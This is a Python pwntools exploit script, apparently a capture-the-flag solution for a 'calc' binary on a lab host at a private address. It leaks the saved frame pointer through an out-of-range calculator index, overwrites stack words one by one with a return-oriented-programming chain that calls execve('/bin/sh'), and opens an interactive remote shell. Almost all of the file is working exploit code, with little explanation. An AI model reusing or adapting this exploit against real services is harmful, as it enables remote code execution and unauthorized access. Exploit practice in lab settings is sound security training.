#   -*- coding:utf-8
#!usr/bing.env  python
from pwn import *

DEBUG = 0
if DEBUG:
    context.log_level = 'debug'
    context.terminal = ['tmux','splitw','-h']
    ph = process("./calc")
    gdb.attach(ph,'b *0x08049433')
else:
    ph = remote('172.16.0.99',4000)
    # ph = process("./calc")

# array is the offset from the array to get index of stack

array = ['361','362','363','364','365','366','367',
        '368','369','370','371','372','373','360']
"""
array = ['361','362','363','364','365','366','367',
        '368','369','370','371','372','360']
"""
# stack record value that we need to change to

stack = [0x0808f2d3, 0x080908d0, 0x0807cb7e,
        0x0807cb7e, 0x0807cb7e, 0x0807cb7e,
        0x080701d0, 0x0, 0x0,
        0x0, 0x08049a21, u32('/bin'), u32('/sh\0')]
"""
stack = [0x0808f2d3, 0x080908d0, 0x0807cb7e,
        0x0807cb7e, 0x0807cb7e, 0x0807cb7e,
        0x080701d1, 0x0,
        0x0, 0x08049a21, u32('/bin'), u32('/sh\0')]
"""
ebp_offset = 0x10

def getStack():
    s = '+' + array[len(array)-1]
    # get the old ebp
    ph.send(s + '\n')
    num = int(ph.recv(1024))
    num += 0x100000000
    print "receive the ebp is %x and ebx is %x"%(num,num+ebp_offset)
    stack[9] = num + ebp_offset


def writeStack():

    for i in range(len(stack)):
        s = '+' + array[i]
        print "[*] - send " + s

        ph.send(s + '\n')
        num = int(ph.recv(1024))

        offset = stack[i] - num
        print "[*] - receive the %x,offset is %x"%(num, offset)

        if offset<0:
            s_ = s + '-' + str(-offset) + '\n'

        else:
            s_ = s + '+' + str(offset) + '\n'
        print "[*] - and send " + s_
        ph.send(s_)
        value = int(ph.recv(1024))
        if value<0:
            value+=0x100000000
        while value!=stack[i]:
            print "[!] the value is %x"%(value)
            offset = stack[i] - value
            if offset<0:
                ph.send(s + '-' + str(-offset) +'\n')
            else:
                ph.send(s + '+' + str(offset) + '\n')
            print "[!] go on send " + array[i]
            value = int(ph.recv(1024))
            if value<0:
                value+=0x100000000
        print "[!] new value is %x"%value
        print "-----------------------------"

    ph.send("=======================\n")

if __name__ == "__main__":
    print ph.recv(1024)
    getStack()
    writeStack()
    ph.interactive()
